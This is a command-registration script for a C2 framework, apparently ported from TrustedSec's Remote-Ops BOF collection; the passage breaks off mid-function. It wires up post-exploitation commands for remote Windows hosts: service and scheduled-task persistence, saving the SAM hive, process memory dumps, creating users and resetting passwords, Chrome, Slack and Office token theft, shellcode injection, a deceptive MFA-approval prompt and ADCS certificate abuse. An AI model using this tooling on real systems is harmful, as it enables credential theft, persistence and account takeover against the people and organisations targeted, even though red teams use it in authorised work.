// ============================================================
// TrustedSec CS-Remote-OPs-BOF — Remote AXS
// Original: https://github.com/trustedsec/CS-Remote-OPs-BOF
// Source CNA: Remote/Remote.cna
//
// Place this file at: <repo>/Remote/TrustedSec-Remote-Ops.axs
// BOF layout: <bofname>/<bofname>.<arch>.o
// ============================================================

// ── Constants ───────────────────────────────────────────────

const REG_HIVES_RO = { HKCR: 0, HKCU: 1, HKLM: 2, HKU: 3 };

const REG_TYPES = {
    REG_SZ:        1,
    REG_EXPAND_SZ: 2,
    REG_BINARY:    3,
    REG_DWORD:     4,
    REG_MULTI_SZ:  7,
    REG_QWORD:     11
};

const SVC_START_MODES = { boot: 0, system: 1, auto: 2, demand: 3, disabled: 4 };
const SVC_ERROR_MODES = { ignore: 0, normal: 1, severe: 2, critical: 3 };
const SVC_TYPES_MAP   = { kernel: 1, fs: 2, own: 0x10, share: 0x20 };

// ── Helper ──────────────────────────────────────────────────

function execBof(id, cmdline, bofname, args, msg, ttp) {
    let bof_path = ax.script_dir() + bofname + "/" + bofname + "." + ax.arch(id) + ".o";
    let task_msg = (msg && msg !== "") ? msg : "Tasked agent to run " + bofname + " BOF";
    if (ttp && ttp !== "") task_msg += " (" + ttp + ")";
    let exec_cmd = args ? `execute bof ${bof_path} ${args}` : `execute bof ${bof_path}`;
    ax.execute_alias(id, cmdline, exec_cmd, task_msg);
}

// ── Service Control ──────────────────────────────────────────

// sc_description
let sc_description_cmd = ax.create_command(
    "sc_description",
    "Set a service description string.",
    "sc_description <servicename> <description> [hostname]"
);
sc_description_cmd.addArgString("servicename", true,  "service name");
sc_description_cmd.addArgString("description", true,  "description text");
sc_description_cmd.addArgString("hostname",    false, "target hostname (default: local)");
sc_description_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("cstr,cstr,cstr",
        [parsed_json["hostname"] || "", parsed_json["servicename"], parsed_json["description"]]);
    execBof(id, cmdline, "sc_description", args,
        `Setting description for service '${parsed_json["servicename"]}'`, "T1543.003");
});

// sc_config
let sc_config_cmd = ax.create_command(
    "sc_config",
    "Modify a service binary path, start type, and error mode.",
    "sc_config <servicename> <binpath> [--start <auto|demand|disabled|boot|system>] [--error <ignore|normal|severe|critical>] [--host <hostname>]"
);
sc_config_cmd.addArgString("servicename", true,  "service name");
sc_config_cmd.addArgString("binpath",     true,  "service binary path");
sc_config_cmd.addArgFlagString("--start", "startmode", false, "start type: auto demand disabled boot system (default: demand)");
sc_config_cmd.addArgFlagString("--error", "errormode", false, "error mode: ignore normal severe critical (default: normal)");
sc_config_cmd.addArgFlagString("--host",  "hostname",  false, "target hostname (default: local)");
sc_config_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let start_str = (parsed_json["startmode"] || "demand").toLowerCase();
    let error_str = (parsed_json["errormode"] || "normal").toLowerCase();
    if (!(start_str in SVC_START_MODES)) throw new Error("Invalid start mode. Use: auto demand disabled boot system");
    if (!(error_str in SVC_ERROR_MODES)) throw new Error("Invalid error mode. Use: ignore normal severe critical");
    let args = ax.bof_pack("cstr,cstr,cstr,short,short",
        [parsed_json["hostname"] || "", parsed_json["servicename"], parsed_json["binpath"],
         SVC_ERROR_MODES[error_str], SVC_START_MODES[start_str]]);
    execBof(id, cmdline, "sc_config", args,
        `Configuring service '${parsed_json["servicename"]}'`, "T1543.003");
});

// sc_failure
let sc_failure_cmd = ax.create_command(
    "sc_failure",
    "Set service failure actions.",
    "sc_failure <servicename> <reset_period> [--reboot <msg>] [--command <cmd>] [--actions <type:delay,...>] [--host <hostname>]\n  actions: run:1000,restart:2000,reboot:3000"
);
sc_failure_cmd.addArgString("servicename",   true,  "service name");
sc_failure_cmd.addArgInt("reset_period",     true,  "failure count reset period in seconds (0 = never reset)");
sc_failure_cmd.addArgFlagString("--reboot",  "rebootmsg", false, "message shown before reboot action");
sc_failure_cmd.addArgFlagString("--command", "command",   false, "command run on failure");
sc_failure_cmd.addArgFlagString("--actions", "actions",   false, "failure actions: type:delay,... (run/restart/reboot)");
sc_failure_cmd.addArgFlagString("--host",    "hostname",  false, "target hostname (default: local)");
sc_failure_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let actions_str = parsed_json["actions"] || "";
    let numactions  = actions_str ? actions_str.split(",").length : 0;
    let args = ax.bof_pack("cstr,cstr,int,cstr,cstr,short,cstr",
        [parsed_json["hostname"]     || "",
         parsed_json["servicename"],
         parsed_json["reset_period"] || 0,
         parsed_json["rebootmsg"]    || "",
         parsed_json["command"]      || "",
         numactions, actions_str]);
    execBof(id, cmdline, "sc_failure", args,
        `Setting failure actions for service '${parsed_json["servicename"]}'`, "T1543.003");
});

// sc_create
let sc_create_cmd = ax.create_command(
    "sc_create",
    "Create a new Windows service.",
    "sc_create <servicename> <binpath> [--display <name>] [--desc <text>] [--start <auto|demand|disabled|boot|system>] [--error <ignore|normal|severe|critical>] [--type <own|share|kernel|fs>] [--host <hostname>]"
);
sc_create_cmd.addArgString("servicename",   true,  "service name");
sc_create_cmd.addArgString("binpath",       true,  "service binary path");
sc_create_cmd.addArgFlagString("--display", "displayname", false, "display name (default: servicename)");
sc_create_cmd.addArgFlagString("--desc",    "description", false, "service description");
sc_create_cmd.addArgFlagString("--start",   "startmode",   false, "start type: auto demand disabled boot system (default: demand)");
sc_create_cmd.addArgFlagString("--error",   "errormode",   false, "error mode: ignore normal severe critical (default: normal)");
sc_create_cmd.addArgFlagString("--type",    "svctype",     false, "service type: own share kernel fs (default: own)");
sc_create_cmd.addArgFlagString("--host",    "hostname",    false, "target hostname (default: local)");
sc_create_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let start_str = (parsed_json["startmode"] || "demand").toLowerCase();
    let error_str = (parsed_json["errormode"] || "normal").toLowerCase();
    let type_str  = (parsed_json["svctype"]   || "own").toLowerCase();
    if (!(start_str in SVC_START_MODES)) throw new Error("Invalid start mode. Use: auto demand disabled boot system");
    if (!(error_str in SVC_ERROR_MODES)) throw new Error("Invalid error mode. Use: ignore normal severe critical");
    if (!(type_str  in SVC_TYPES_MAP))   throw new Error("Invalid service type. Use: own share kernel fs");
    let args = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,short,short,short",
        [parsed_json["hostname"]    || "",
         parsed_json["servicename"],
         parsed_json["binpath"],
         parsed_json["displayname"] || parsed_json["servicename"],
         parsed_json["description"] || "",
         SVC_ERROR_MODES[error_str], SVC_START_MODES[start_str], SVC_TYPES_MAP[type_str]]);
    execBof(id, cmdline, "sc_create", args,
        `Creating service '${parsed_json["servicename"]}'`, "T1543.003");
});

// sc_delete
let sc_delete_cmd = ax.create_command(
    "sc_delete",
    "Delete a Windows service.",
    "sc_delete <servicename> [hostname]"
);
sc_delete_cmd.addArgString("servicename", true,  "service name");
sc_delete_cmd.addArgString("hostname",    false, "target hostname (default: local)");
sc_delete_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("cstr,cstr",
        [parsed_json["hostname"] || "", parsed_json["servicename"]]);
    execBof(id, cmdline, "sc_delete", args,
        `Deleting service '${parsed_json["servicename"]}'`, "T1543.003");
});

// sc_stop
let sc_stop_cmd = ax.create_command(
    "sc_stop",
    "Stop a Windows service.",
    "sc_stop <servicename> [hostname]"
);
sc_stop_cmd.addArgString("servicename", true,  "service name");
sc_stop_cmd.addArgString("hostname",    false, "target hostname (default: local)");
sc_stop_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("cstr,cstr",
        [parsed_json["hostname"] || "", parsed_json["servicename"]]);
    execBof(id, cmdline, "sc_stop", args,
        `Stopping service '${parsed_json["servicename"]}'`, "T1489");
});

// sc_start
let sc_start_cmd = ax.create_command(
    "sc_start",
    "Start a Windows service.",
    "sc_start <servicename> [hostname]"
);
sc_start_cmd.addArgString("servicename", true,  "service name");
sc_start_cmd.addArgString("hostname",    false, "target hostname (default: local)");
sc_start_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("cstr,cstr",
        [parsed_json["hostname"] || "", parsed_json["servicename"]]);
    execBof(id, cmdline, "sc_start", args,
        `Starting service '${parsed_json["servicename"]}'`, "T1543.003");
});

// ── Registry ─────────────────────────────────────────────────

// reg_set
let reg_set_cmd = ax.create_command(
    "reg_set",
    "Set a registry value.",
    "reg_set <HIVE> <path> <key> <type> <value> [--host <hostname>]\n  Hives: HKLM HKCU HKU HKCR\n  Types: REG_SZ REG_EXPAND_SZ REG_BINARY REG_DWORD REG_MULTI_SZ REG_QWORD\n  For REG_BINARY, value is a path to a binary file."
);
reg_set_cmd.addArgString("hive",  true,  "registry hive: HKLM HKCU HKU HKCR");
reg_set_cmd.addArgString("path",  true,  "registry key path");
reg_set_cmd.addArgString("key",   true,  "value name");
reg_set_cmd.addArgString("type",  true,  "value type: REG_SZ REG_EXPAND_SZ REG_BINARY REG_DWORD REG_MULTI_SZ REG_QWORD");
reg_set_cmd.addArgString("value", true,  "data to write (file path for REG_BINARY, integer for DWORD/QWORD)");
reg_set_cmd.addArgFlagString("--host", "hostname", false, "target hostname (default: local)");
reg_set_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let hive_str = parsed_json["hive"].toUpperCase();
    let type_str = parsed_json["type"].toUpperCase();
    if (!(hive_str in REG_HIVES_RO)) throw new Error("Invalid hive. Use: HKLM HKCU HKU HKCR");
    if (!(type_str in REG_TYPES))    throw new Error("Invalid type. Use: REG_SZ REG_EXPAND_SZ REG_BINARY REG_DWORD REG_MULTI_SZ REG_QWORD");
    let hostname = parsed_json["hostname"] || null;
    let hive     = REG_HIVES_RO[hive_str];
    let type_int = REG_TYPES[type_str];
    let path     = parsed_json["path"];
    let key      = parsed_json["key"];
    let value    = parsed_json["value"];
    let args;
    if (type_int === REG_TYPES["REG_BINARY"]) {
        let data = ax.read_file(value);
        args = ax.bof_pack("cstr,int,cstr,cstr,int,bin", [hostname, hive, path, key, type_int, data]);
    } else if (type_int === REG_TYPES["REG_DWORD"] || type_int === REG_TYPES["REG_QWORD"]) {
        args = ax.bof_pack("cstr,int,cstr,cstr,int,int", [hostname, hive, path, key, type_int, parseInt(value)]);
    } else {
        args = ax.bof_pack("cstr,int,cstr,cstr,int,cstr", [hostname, hive, path, key, type_int, value]);
    }
    execBof(id, cmdline, "reg_set", args,
        `Setting ${hive_str}\\${path}\\${key}`, "T1112");
});

// reg_delete
let reg_delete_cmd = ax.create_command(
    "reg_delete",
    "Delete a registry value or subkey.",
    "reg_delete <HIVE> <path> <key> [--deletekey] [--host <hostname>]\n  Hives: HKLM HKCU HKU HKCR\n  --deletekey: delete entire subkey instead of just the named value"
);
reg_delete_cmd.addArgString("hive", true,  "registry hive: HKLM HKCU HKU HKCR");
reg_delete_cmd.addArgString("path", true,  "registry key path");
reg_delete_cmd.addArgString("key",  true,  "value name (or subkey if --deletekey)");
reg_delete_cmd.addArgBool("--deletekey", "delete the entire subkey instead of the value");
reg_delete_cmd.addArgFlagString("--host", "hostname", false, "target hostname (default: local)");
reg_delete_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let hive_str = parsed_json["hive"].toUpperCase();
    if (!(hive_str in REG_HIVES_RO)) throw new Error("Invalid hive. Use: HKLM HKCU HKU HKCR");
    let delkey = parsed_json["--deletekey"] ? 1 : 0;
    let args = ax.bof_pack("cstr,int,cstr,cstr,int",
        [parsed_json["hostname"] || null, REG_HIVES_RO[hive_str],
         parsed_json["path"], parsed_json["key"], delkey]);
    execBof(id, cmdline, "reg_delete", args,
        `Deleting ${hive_str}\\${parsed_json["path"]}\\${parsed_json["key"]}`, "T1112");
});

// reg_export
let reg_export_cmd = ax.create_command(
    "reg_export",
    "Export a registry hive or subkey to a .reg text file (KEY_READ, no SeBackupPrivilege required).",
    "reg_export <HIVE> <output> [subkey]\n  Hives: HKLM HKCU HKU HKCR\n  Omit subkey to export the entire hive.\n  Output is a Windows .reg text file importable with regedit.\n  Examples:\n    reg_export HKCU C:\\Windows\\Temp\\hkcu.reg\n    reg_export HKLM C:\\Windows\\Temp\\sam.reg SAM"
);
reg_export_cmd.addArgString("hive",   true,  "registry hive: HKLM HKCU HKU HKCR");
reg_export_cmd.addArgString("output", true,  "output .reg file path");
reg_export_cmd.addArgString("subkey", false, "subkey path within the hive (omit for entire hive)");
reg_export_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let hive_str = parsed_json["hive"].toUpperCase();
    if (!(hive_str in REG_HIVES_RO)) throw new Error("Invalid hive. Use: HKLM HKCU HKU HKCR");
    let subkey = parsed_json["subkey"] || "";
    let label  = subkey ? `${hive_str}\\${subkey}` : hive_str;
    let args = ax.bof_pack("cstr,cstr,int",
        [subkey, parsed_json["output"], REG_HIVES_RO[hive_str]]);
    execBof(id, cmdline, "reg_export", args,
        `Exporting ${label} to ${parsed_json["output"]}`, "T1012");
});

// reg_save
let reg_save_cmd = ax.create_command(
    "reg_save",
    "Save a registry hive or subkey to a file. RegSaveKeyExA requires SeBackupPrivilege — run 'get_priv SeBackupPrivilege' first.",
    "reg_save <HIVE> <output> [regpath]\n  Hives: HKLM HKCU HKU HKCR\n  Omit regpath to save the entire hive.\n  NOTE: RegSaveKeyExA always requires SeBackupPrivilege regardless of hive.\n  Examples:\n    get_priv SeBackupPrivilege\n    reg_save HKCU C:\\Windows\\Temp\\hkcu.bak\n    reg_save HKLM C:\\Windows\\Temp\\sam.bak SAM"
);
reg_save_cmd.addArgString("hive",    true,  "registry hive: HKLM HKCU HKU HKCR");
reg_save_cmd.addArgString("output",  true,  "output file path");
reg_save_cmd.addArgString("regpath", false, "subkey path within the hive (omit for entire hive)");
reg_save_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let hive_str = parsed_json["hive"].toUpperCase();
    if (!(hive_str in REG_HIVES_RO)) throw new Error("Invalid hive. Use: HKLM HKCU HKU HKCR");
    let regpath = parsed_json["regpath"] || "";
    let label   = regpath ? `${hive_str}\\${regpath}` : hive_str;
    let args = ax.bof_pack("cstr,cstr,int",
        [regpath, parsed_json["output"], REG_HIVES_RO[hive_str]]);
    execBof(id, cmdline, "reg_save", args,
        `Saving ${label} to ${parsed_json["output"]}`, "T1003.002");
});

// ── Scheduled Tasks ──────────────────────────────────────────

// schtaskscreate
let schtaskscreate_cmd = ax.create_command(
    "schtaskscreate",
    "Create a scheduled task from an XML definition file.",
    "schtaskscreate <taskpath> <xmlfile> [--server <host>] [--username <user>] [--password <pass>] [--mode <1|2>] [--force]\n  mode: 1=create (default), 2=update existing"
);
schtaskscreate_cmd.addArgString("taskpath",          true,  "task path, e.g. \\MyTask");
schtaskscreate_cmd.addArgString("xmlfile",           true,  "path to task XML definition file");
schtaskscreate_cmd.addArgFlagString("--server",   "server",   false, "target server (default: local)");
schtaskscreate_cmd.addArgFlagString("--username", "username", false, "username for remote auth");
schtaskscreate_cmd.addArgFlagString("--password", "password", false, "password for remote auth");
schtaskscreate_cmd.addArgFlagInt("--mode",        "mode",     false, "1=create new, 2=update existing (default: 1)");
schtaskscreate_cmd.addArgBool("--force", "overwrite task if it already exists");
schtaskscreate_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let xmldata = ax.read_file(parsed_json["xmlfile"]);
    let force   = parsed_json["--force"] ? 1 : 0;
    let args = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,int,int",
        [parsed_json["server"]   || "",
         parsed_json["username"] || "",
         parsed_json["password"] || "",
         parsed_json["taskpath"],
         xmldata,
         parsed_json["mode"] || 1,
         force]);
    execBof(id, cmdline, "schtaskscreate", args,
        `Creating scheduled task '${parsed_json["taskpath"]}'`, "T1053.005");
});

// schtasksdelete
let schtasksdelete_cmd = ax.create_command(
    "schtasksdelete",
    "Delete a scheduled task or task folder.",
    "schtasksdelete <taskname> [--server <host>] [--folder]"
);
schtasksdelete_cmd.addArgString("taskname", true,  "task path or folder path to delete");
schtasksdelete_cmd.addArgFlagString("--server", "server", false, "target server (default: local)");
schtasksdelete_cmd.addArgBool("--folder", "delete a task folder instead of a task");
schtasksdelete_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let isfolder = parsed_json["--folder"] ? 1 : 0;
    let args = ax.bof_pack("wstr,wstr,int",
        [parsed_json["server"] || "", parsed_json["taskname"], isfolder]);
    execBof(id, cmdline, "schtasksdelete", args,
        `Deleting scheduled task '${parsed_json["taskname"]}'`, "T1053.005");
});

// schtasksstop
let schtasksstop_cmd = ax.create_command(
    "schtasksstop",
    "Stop a running scheduled task.",
    "schtasksstop <taskname> [--server <host>]"
);
schtasksstop_cmd.addArgString("taskname", true, "task path");
schtasksstop_cmd.addArgFlagString("--server", "server", false, "target server (default: local)");
schtasksstop_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("wstr,wstr", [parsed_json["server"] || "", parsed_json["taskname"]]);
    execBof(id, cmdline, "schtasksstop", args,
        `Stopping scheduled task '${parsed_json["taskname"]}'`, "T1053.005");
});

// schtasksrun
let schtasksrun_cmd = ax.create_command(
    "schtasksrun",
    "Run a scheduled task immediately.",
    "schtasksrun <taskname> [--server <host>]"
);
schtasksrun_cmd.addArgString("taskname", true, "task path");
schtasksrun_cmd.addArgFlagString("--server", "server", false, "target server (default: local)");
schtasksrun_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("wstr,wstr", [parsed_json["server"] || "", parsed_json["taskname"]]);
    execBof(id, cmdline, "schtasksrun", args,
        `Running scheduled task '${parsed_json["taskname"]}'`, "T1053.005");
});

// ── Process ──────────────────────────────────────────────────

// procdump
let procdump_cmd = ax.create_command(
    "procdump",
    "Dump process memory to a file.",
    "procdump <pid> <output_file>"
);
procdump_cmd.addArgInt("pid",       true, "target process PID");
procdump_cmd.addArgString("output", true, "output file path");
procdump_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("int,wstr", [parsed_json["pid"], parsed_json["output"]]);
    execBof(id, cmdline, "procdump", args,
        `Dumping PID ${parsed_json["pid"]} to ${parsed_json["output"]}`, "T1003.001");
});

// ProcessListHandles
let ProcessListHandles_cmd = ax.create_command(
    "ProcessListHandles",
    "List open handles in a process.",
    "ProcessListHandles <pid>"
);
ProcessListHandles_cmd.addArgInt("pid", true, "target process PID");
ProcessListHandles_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("int", [parsed_json["pid"]]);
    execBof(id, cmdline, "ProcessListHandles", args,
        `Listing handles in PID ${parsed_json["pid"]}`, "T1057");
});

// ProcessDestroy
let ProcessDestroy_cmd = ax.create_command(
    "ProcessDestroy",
    "Close a specific handle inside a remote process.",
    "ProcessDestroy <pid> <handle>"
);
ProcessDestroy_cmd.addArgInt("pid",    true, "target process PID");
ProcessDestroy_cmd.addArgInt("handle", true, "handle value to close");
ProcessDestroy_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("int,int", [parsed_json["pid"], parsed_json["handle"]]);
    execBof(id, cmdline, "ProcessDestroy", args,
        `Closing handle 0x${parsed_json["handle"].toString(16)} in PID ${parsed_json["pid"]}`, null);
});

// ── User Accounts ────────────────────────────────────────────

// enableuser
let enableuser_cmd = ax.create_command(
    "enableuser",
    "Enable a local user account.",
    "enableuser <username> [hostname]"
);
enableuser_cmd.addArgString("username", true,  "username to enable");
enableuser_cmd.addArgString("hostname", false, "target hostname (default: local)");
enableuser_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    // BOF arg order: hostname, username
    let args = ax.bof_pack("wstr,wstr",
        [parsed_json["hostname"] || "", parsed_json["username"]]);
    execBof(id, cmdline, "enableuser", args,
        `Enabling user '${parsed_json["username"]}'`, "T1098");
});

// setuserpass
let setuserpass_cmd = ax.create_command(
    "setuserpass",
    "Set password for a local user account.",
    "setuserpass <username> <password> [hostname]"
);
setuserpass_cmd.addArgString("username", true,  "target username");
setuserpass_cmd.addArgString("password", true,  "new password");
setuserpass_cmd.addArgString("hostname", false, "target hostname (default: local)");
setuserpass_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    // BOF arg order: hostname, username, password
    let args = ax.bof_pack("wstr,wstr,wstr",
        [parsed_json["hostname"] || "", parsed_json["username"], parsed_json["password"]]);
    execBof(id, cmdline, "setuserpass", args,
        `Setting password for '${parsed_json["username"]}'`, "T1098");
});

// addusertogroup
let addusertogroup_cmd = ax.create_command(
    "addusertogroup",
    "Add a user to a local group.",
    "addusertogroup <username> <group> [domain] [hostname]"
);
addusertogroup_cmd.addArgString("username", true,  "username to add");
addusertogroup_cmd.addArgString("group",    true,  "target local group");
addusertogroup_cmd.addArgString("domain",   false, "domain name (default: local)");
addusertogroup_cmd.addArgString("hostname", false, "target hostname (default: local)");
addusertogroup_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    // BOF arg order: hostname, domain, username, group
    let args = ax.bof_pack("wstr,wstr,wstr,wstr",
        [parsed_json["hostname"] || "", parsed_json["domain"] || "",
         parsed_json["username"], parsed_json["group"]]);
    execBof(id, cmdline, "addusertogroup", args,
        `Adding '${parsed_json["username"]}' to group '${parsed_json["group"]}'`, "T1098");
});

// adduser
let adduser_cmd = ax.create_command(
    "adduser",
    "Create a new local user account.",
    "adduser <username> <password> [hostname]"
);
adduser_cmd.addArgString("username", true,  "new username");
adduser_cmd.addArgString("password", true,  "password for the new account");
adduser_cmd.addArgString("hostname", false, "target hostname (default: local)");
adduser_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("wstr,wstr,wstr",
        [parsed_json["username"], parsed_json["password"], parsed_json["hostname"] || ""]);
    execBof(id, cmdline, "adduser", args,
        `Creating local user '${parsed_json["username"]}'`, "T1136.001");
});

// unexpireuser
let unexpireuser_cmd = ax.create_command(
    "unexpireuser",
    "Remove password expiration from a local user account.",
    "unexpireuser <username> [hostname]"
);
unexpireuser_cmd.addArgString("username", true,  "target username");
unexpireuser_cmd.addArgString("hostname", false, "target hostname (default: local)");
unexpireuser_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    // BOF arg order: hostname, username
    let args = ax.bof_pack("wstr,wstr",
        [parsed_json["hostname"] || "", parsed_json["username"]]);
    execBof(id, cmdline, "unexpireuser", args,
        `Removing password expiry for '${parsed_json["username"]}'`, "T1098");
});

// ── Credentials / Tokens ─────────────────────────────────────

// chromeKey
let chromeKey_cmd = ax.create_command(
    "chromeKey",
    "Extract Chrome DPAPI master encryption key.",
    "chromeKey"
);
chromeKey_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    execBof(id, cmdline, "chromeKey", null, "Extracting Chrome encryption key", "T1555.003");
});

// slackKey
let slackKey_cmd = ax.create_command(
    "slackKey",
    "Extract Slack encryption key from disk.",
    "slackKey"
);
slackKey_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    execBof(id, cmdline, "slackKey", null, "Extracting Slack encryption key", "T1528");
});

// slack_cookie
let slack_cookie_cmd = ax.create_command(
    "slack_cookie",
    "Extract Slack session cookie from a running process.",
    "slack_cookie <pid>"
);
slack_cookie_cmd.addArgInt("pid", true, "Slack process PID");
slack_cookie_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("int", [parsed_json["pid"]]);
    execBof(id, cmdline, "slack_cookie", args,
        `Extracting Slack cookie from PID ${parsed_json["pid"]}`, "T1528");
});

// shspawnas
let shspawnas_cmd = ax.create_command(
    "shspawnas",
    "Spawn a process as another user and inject shellcode.",
    "shspawnas <domain> <username> <password> <shellcode_file>\n  domain: use . for local accounts"
);
shspawnas_cmd.addArgString("domain",         true, "user domain (. for local)");
shspawnas_cmd.addArgString("username",       true, "username");
shspawnas_cmd.addArgString("password",       true, "password");
shspawnas_cmd.addArgString("shellcode_file", true, "path to raw shellcode file");
shspawnas_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let shellcode = ax.read_file(parsed_json["shellcode_file"]);
    let args = ax.bof_pack("wstr,wstr,wstr,bin",
        [parsed_json["domain"], parsed_json["username"], parsed_json["password"], shellcode]);
    execBof(id, cmdline, "shspawnas", args,
        `Spawning as ${parsed_json["domain"]}\\${parsed_json["username"]} and injecting shellcode`,
        "T1134.002");
});

// office_tokens
let office_tokens_cmd = ax.create_command(
    "office_tokens",
    "Steal Office OAuth tokens from a running Office process.",
    "office_tokens <pid>"
);
office_tokens_cmd.addArgInt("pid", true, "target Office process PID");
office_tokens_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("int", [parsed_json["pid"]]);
    execBof(id, cmdline, "office_tokens", args,
        `Stealing Office tokens from PID ${parsed_json["pid"]}`, "T1528");
});

// get_azure_token
let get_azure_token_cmd = ax.create_command(
    "get_azure_token",
    "Request an Azure/Entra ID OAuth access token via browser pop-up.",
    "get_azure_token <client_id> <scope> [--browser <1|2|3>] [--hint <upn>] [--browser_path <path>]\n  browser: 1=system default (default), 2=Chrome, 3=Edge"
);
get_azure_token_cmd.addArgString("client_id", true,  "Azure application client ID");
get_azure_token_cmd.addArgString("scope",     true,  "OAuth2 scope URL");
get_azure_token_cmd.addArgFlagInt("--browser",         "browser_type", false, "1=default 2=chrome 3=edge (default: 1)");
get_azure_token_cmd.addArgFlagString("--hint",         "hint",         false, "login hint (UPN/email)");
get_azure_token_cmd.addArgFlagString("--browser_path", "browser_path", false, "custom browser executable path");
get_azure_token_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("cstr,cstr,int,cstr,cstr",
        [parsed_json["client_id"],
         parsed_json["scope"],
         parsed_json["browser_type"] || 1,
         parsed_json["hint"]         || "",
         parsed_json["browser_path"] || ""]);
    execBof(id, cmdline, "get_azure_token", args, "Requesting Azure access token", "T1528");
});

// ask_mfa
let ask_mfa_cmd = ax.create_command(
    "ask_mfa",
    "Display a convincing MFA number prompt to the target user.",
    "ask_mfa <number>\n  Shows the number on screen to trick the user into approving an MFA push"
);
ask_mfa_cmd.addArgInt("number", true, "MFA number to display (1-99)");
ask_mfa_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let args = ax.bof_pack("int", [parsed_json["number"]]);
    execBof(id, cmdline, "ask_mfa", args,
        `Displaying MFA prompt ${parsed_json["number"]}`, "T1621");
});

// make_token_cert
let make_token_cert_cmd = ax.create_command(
    "make_token_cert",
    "Create an impersonation token from a PFX certificate (Kerberos PKINIT).",
    "make_token_cert <pfx_file> <password>"
);
make_token_cert_cmd.addArgString("pfx_file", true, "path to PFX certificate file");
make_token_cert_cmd.addArgString("password", true, "PFX file password");
make_token_cert_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let cert_data = ax.read_file(parsed_json["pfx_file"]);
    let args = ax.bof_pack("bin,wstr", [cert_data, parsed_json["password"]]);
    execBof(id, cmdline, "make_token_cert", args,
        "Creating impersonation token from certificate", "T1134.001");
});

// ── ADCS ─────────────────────────────────────────────────────

// adcs_request
let adcs_request_cmd = ax.create_command(
    "adcs_request",
    "Request a certificate from Active Directory Certificate Services.",
    "adcs_request <ca> <template> [--subject <cn>] [--altname <upn>] [--alturl <url>] [--install] [--machine] [--app_policy] [--dns]"
);
adcs_request_cmd.addArgString("ca",       true,  "CA name in SERVER\\CA-NAME format");
adcs_request_cmd.addArgString("template", true,  "certificate template name");
adcs_request_cmd.addArgFlagString("--subject",  "subject",    false, "subject CN for the certificate");
adcs_request_cmd.addArgFlagString("--altname",  "altname",    false, "SAN UPN (user principal name)");
adcs_request_cmd.addArgFlagString("--alturl",   "alturl",     false, "SAN URL");
adcs_request_cmd.addArgBool("--install",    "install the certificate into the local store after enrollment");
adcs_request_cmd.addArgBool("--machine",    "request a machine (computer account) certificate");
adcs_request_cmd.addArgBool("--app_policy", "include application policy extension in request");
adcs_request_cmd.addArgBool("--dns",        "include DNS SAN in the certificate request");
adcs_request_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let install    = parsed_json["--install"]    ? 1 : 0;
    let machine    = parsed_json["--machine"]    ? 1 : 0;
    let app_policy = parsed_json["--app_policy"] ? 1 : 0;
    let dns        = parsed_json["--dns"]        ? 1 : 0;
    let args = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,short,short,short,short",
        [parsed_json["ca"],
         parsed_json["template"],
         parsed_json["subject"]  || "",
         parsed_json["altname"]  || "",
         parsed_json["alturl"]   || "",
         install, machine, app_policy, dns]);
    execBof(id, cmdline, "adcs_request", args,
        `Requesting cert from '${parsed_json["ca"]}' template '${parsed_json["template"]}'`, "T1649");
});

// adcs_request_on_behalf
let adcs_request_on_behalf_cmd = ax.create_command(
    "adcs_request_on_behalf",
    "Request a certificate on behalf of another user using an enrollment agent PFX.",
    "adcs_request_on_behalf <ca> <template> <pfx_file> [altname]"
);
adcs_request_on_behalf_cmd.addArgString("ca",       true,  "CA name in SERVER\\CA-NAME format");
adcs_request_on_behalf_cmd.addArgString("template", true,  "certificate template name");
adcs_request_on_behalf_cmd.addArgString("pfx_file", true,  "enrollment agent PFX certificate file path");
adcs_request_on_behalf_cmd.addArgString("altname",  false, "target user UPN (SAN alternative name)");
adcs_request_on_behalf_cmd.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    let pfx_data = ax.read_file(parsed_json["pfx_file"]);
    let args = ax.bof_pack("wstr,wstr,cstr,bin",
        [parsed_json["ca"], parsed_json["template"],
         parsed_json["altname"] || "", pfx_data]);
    execBof(id, cmdline, "adcs_request_on_behalf", args,
